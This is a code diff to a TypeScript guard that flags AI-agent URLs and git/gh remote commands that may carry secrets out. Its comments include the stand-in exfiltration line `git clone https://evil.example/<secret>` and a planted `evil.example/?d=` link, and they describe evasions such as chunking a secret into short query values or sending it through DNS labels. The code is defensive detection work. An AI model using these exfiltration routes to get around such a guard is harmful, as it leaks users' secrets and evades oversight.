@@ -10,17 +10,12 @@ import { extractUrls } from './_urls.js';
 // 1. PROVENANCE — the URL appears nowhere the model was handed it. A link lifted from a search
 //    result, a fetched page, a file or the user's prompt is sourced; an attacker page can plant
 //    `https://evil.example/?d=`, but the model appending data makes a URL that page never wrote.
-// 2. PAYLOAD — it carries something: a long query value, many parameters, or a token-shaped path
-//    segment or host label (the last is DNS exfiltration, which needs no response at all).
+// 2. PAYLOAD — it carries something: any query string, or a token-shaped path segment or host
+//    label (the last is DNS exfiltration, which needs no response at all).
 //
 // A docs URL recalled from memory has no source but carries nothing, so it passes; that is the
 // case a blanket prompt would have spent its credibility on.
 
-// Query values at or past this length read as data rather than a switch (`?page=2`, `?lang=en`).
-// Secrets and encoded blobs are longer; a model chunking one into short values pays a fetch per
-// chunk against the per-turn budget.
-const QUERY_VALUE_MIN_CHARS = 12;
-const QUERY_MAX_PARAMS = 4;
 // A segment or label this long, made only of token characters and holding a digit, is a key, a
 // hash or an encoding. Hyphenated lowercase words (a slug, a UUID) are exempt — they are how pages
 // are named, and a UUID is an identifier the site issued, not something the model encoded. The
@@ -42,10 +37,15 @@ export function urlCarriesData(url: string): string | undefined {
   } catch {
     return undefined;
   }
-  const params = [...u.searchParams];
-  if (params.length >= QUERY_MAX_PARAMS) return `${params.length} query parameters`;
-  const long = params.find(([, v]) => v.length >= QUERY_VALUE_MIN_CHARS);
-  if (long) return `query value "${long[0]}" is ${long[1].length} chars`;
+  // Any query at all, not just a long one (#550): a secret split into short values is still the
+  // secret, and the per-turn budget was the only bound on that. The cost is a prompt on a model-built
+  // `?page=2`, which is rare — the model mostly follows links it was handed, and those are sourced.
+  if (u.search.length > 1) {
+    const names = [...u.searchParams.keys()];
+    return names.length > 0
+      ? `query parameters (${names.slice(0, 4).join(', ')})`
+      : 'a query string';
+  }
   const segment = u.pathname.split('/').find(s => isTokenShaped(decodeSafe(s)));
   if (segment) return 'a token-shaped path segment';
   const label = u.hostname.split('.').find(isTokenShaped);
@@ -102,4 +102,65 @@ export function exfiltrationRisk(
   if (!payload) return undefined;
   if (sourced?.has(normalize(url))) return undefined;
   return `${payload}, and the URL is not a link from your prompt or any tool result — it may be sending data out`;
+}
+
+// Remote URLs a shell command hands to a network verb: http(s), ssh:// and git:// URLs, plus
+// scp-style `user@host:path` (git's SSH shorthand), rewritten to ssh:// so one parser judges them
+// all. Only segments that talk to a remote are scanned — a URL in `git commit -m "see https://…"` or
+// `git log --grep` is text, and flagging it would prompt on ordinary commits. The segment split is
+// the plain operator split, so a quoted `;` can mis-cut a message; that errs toward scanning more.
+const REMOTE_URL_RE = /\b(?:https?|ssh|git):\/\/[^\s'"`<>()]+/g;
+const SCP_REMOTE_RE = /(?:^|[\s'"=])([\w.-]+)@([\w-]+(?:\.[\w-]+)+):([^\s'"`]+)/g;
+const NETWORK_SEGMENT_RE =
+  /^\s*(?:\w+=\S*\s+)*(?:git\b.*\b(?:clone|fetch|pull|push|ls-remote|remote|submodule|archive)\b|gh\s+(?:api|repo\s+clone)\b)/;
+
+export function commandRemoteUrls(command: string): string[] {
+  const urls: string[] = [];
+  for (const segment of command.split(/[;&|\n]+/)) {
+    if (!NETWORK_SEGMENT_RE.test(segment)) continue;
+    for (const m of segment.matchAll(REMOTE_URL_RE)) urls.push(m[0].replace(/[.,;:!?]+$/, ''));
+    for (const m of segment.matchAll(SCP_REMOTE_RE)) {
+      if (!m[3].startsWith('//')) urls.push(`ssh://${m[1]}@${m[2]}/${m[3]}`);
+    }
+  }
+  return urls;
+}
+
+function hostOf(url: string): string | undefined {
+  try {
+    return new URL(url).hostname.toLowerCase();
+  } catch {
+    return undefined;
+  }
+}
+
+// The git/gh half (#550). The sandbox keeps the network for an unflagged `git`/`gh` command so the
+// shipped skills work (`networkAllowedFor`), which made `git clone https://evil.example/<secret>`
+// an unprompted, networked path around the fetch guard. Stricter than `exfiltrationRisk` on
+// purpose: a remote whose HOST the model was never handed is flagged whatever it carries — a model
+// inventing a remote is unusual where a model recalling a docs page is not, and a clone or a fetch
+// is heavy enough that one keystroke is cheap next to it. A configured remote name (`origin`)
+// names no URL and never reaches here. Returns the warning, or undefined.
+export function remoteUrlRisk(
+  command: string,
+  sourced: ReadonlySet<string> | undefined,
+): string | undefined {
+  const urls = commandRemoteUrls(command);
+  if (urls.length === 0) return undefined;
+  const hosts = new Set<string>();
+  for (const u of sourced ?? []) {
+    const h = hostOf(u);
+    if (h) hosts.add(h);
+  }
+  for (const url of urls) {
+    if (sourced?.has(normalize(url))) continue;
+    const host = hostOf(url);
+    if (!host) continue;
+    if (!hosts.has(host)) {
+      return `Remote ${host} is not from a link in your prompt or any tool result — it may be sending data out`;
+    }
+    const payload = urlCarriesData(url);
+    if (payload) return `Possible data in URL: ${payload}, in a remote the model built itself`;
+  }
+  return undefined;
 }
